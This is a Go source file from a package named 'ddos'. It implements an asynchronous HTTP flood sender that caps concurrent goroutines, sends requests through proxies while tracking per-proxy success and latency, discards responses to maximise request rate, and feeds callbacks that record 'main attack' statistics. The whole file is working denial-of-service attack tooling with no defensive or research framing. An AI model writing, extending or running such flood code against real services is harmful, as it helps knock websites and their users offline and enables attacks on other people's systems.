package ddos

import (
	"io"
	"net/http"
	"sync/atomic"
	"time"
)

// AsyncSender sends HTTP requests asynchronously without waiting for responses
type AsyncSender struct {
	client       *http.Client
	proxyURL     string // Proxy URL for this sender (for tracking)
	sentCount    int64
	errorCount   int64
	successCount int64 // Track successful requests
	limiter      *GoroutineLimiter
	onSuccess    func(proxy string, responseTime time.Duration) // Callback for success
	onFailure    func(proxy string)                             // Callback for failure
	// Callbacks for main attack stats
	onRequestSuccess func() // Callback when request succeeds
	onRequestFailure func() // Callback when request fails
}

// NewAsyncSender creates a new async sender with goroutine limiting
func NewAsyncSender(client *http.Client) *AsyncSender {
	// Default limit for backward compatibility
	return NewAsyncSenderWithLimit(client, 500)
}

// NewAsyncSenderWithLimit creates a new async sender with custom goroutine limit
func NewAsyncSenderWithLimit(client *http.Client, maxConcurrent int) *AsyncSender {
	if maxConcurrent <= 0 {
		maxConcurrent = 500 // Default fallback
	}
	return &AsyncSender{
		client:  client,
		limiter: NewGoroutineLimiter(maxConcurrent),
	}
}

// NewAsyncSenderWithProxy creates a new async sender with proxy tracking
func NewAsyncSenderWithProxy(client *http.Client, proxyURL string, onSuccess func(string, time.Duration), onFailure func(string)) *AsyncSender {
	// Default limit for backward compatibility
	return NewAsyncSenderWithProxyAndLimit(client, proxyURL, onSuccess, onFailure, 500)
}

// NewAsyncSenderWithProxyAndLimit creates a new async sender with proxy tracking and custom limit
func NewAsyncSenderWithProxyAndLimit(client *http.Client, proxyURL string, onSuccess func(string, time.Duration), onFailure func(string), maxConcurrent int) *AsyncSender {
	sender := NewAsyncSenderWithLimit(client, maxConcurrent)
	sender.proxyURL = proxyURL
	sender.onSuccess = onSuccess
	sender.onFailure = onFailure
	return sender
}

// SetStatsCallbacks sets callbacks for tracking main attack statistics
func (s *AsyncSender) SetStatsCallbacks(onSuccess, onFailure func()) {
	s.onRequestSuccess = onSuccess
	s.onRequestFailure = onFailure
}

// SendAsync sends a request asynchronously without waiting for response
// Uses goroutine limiter to prevent unbounded goroutine creation
func (s *AsyncSender) SendAsync(req *http.Request, skipResponseReading bool) {
	if s == nil || s.client == nil || req == nil {
		return
	}

	atomic.AddInt64(&s.sentCount, 1)
	startTime := time.Now()

	// Use limiter to control goroutine creation
	if s.limiter != nil {
		s.limiter.Execute(func() {
			s.sendRequest(req, skipResponseReading, startTime)
		})
	} else {
		// Fallback if limiter is nil (shouldn't happen, but be safe)
		go func() {
			defer func() {
				if r := recover(); r != nil {
					atomic.AddInt64(&s.errorCount, 1)
				}
			}()
			s.sendRequest(req, skipResponseReading, startTime)
		}()
	}
}

// sendRequest performs the actual request sending (extracted for reuse)
func (s *AsyncSender) sendRequest(req *http.Request, skipResponseReading bool, startTime time.Time) {
	resp, err := s.client.Do(req)
	responseTime := time.Since(startTime)

	if err != nil {
		atomic.AddInt64(&s.errorCount, 1)
		if s.onRequestFailure != nil {
			s.onRequestFailure()
		}
		if s.onFailure != nil && s.proxyURL != "" {
			// Recover from panics in callback
			defer func() {
				if r := recover(); r != nil {
					// Silently recover to prevent crash
				}
			}()
			s.onFailure(s.proxyURL)
		}
		return
	}

	// If skipResponseReading is true, close immediately without reading
	if skipResponseReading {
		if resp.Body != nil {
			resp.Body.Close()
		}
	} else {
		// Minimal read - just enough to complete the request
		if resp.Body != nil {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}

	// Track success
	atomic.AddInt64(&s.successCount, 1)
	if s.onRequestSuccess != nil {
		s.onRequestSuccess()
	}
	if s.onSuccess != nil && s.proxyURL != "" {
		// Recover from panics in callback
		defer func() {
			if r := recover(); r != nil {
				// Silently recover to prevent crash
			}
		}()
		s.onSuccess(s.proxyURL, responseTime)
	}
}

// GetStats returns sender statistics
func (s *AsyncSender) GetStats() (sent int64, errors int64) {
	return atomic.LoadInt64(&s.sentCount), atomic.LoadInt64(&s.errorCount)
}

// Wait waits for all pending async requests to complete
func (s *AsyncSender) Wait() {
	if s.limiter != nil {
		s.limiter.Wait()
	}
}

// Close closes the async sender and waits for all requests
func (s *AsyncSender) Close() {
	if s.limiter != nil {
		s.limiter.Close()
	}
}
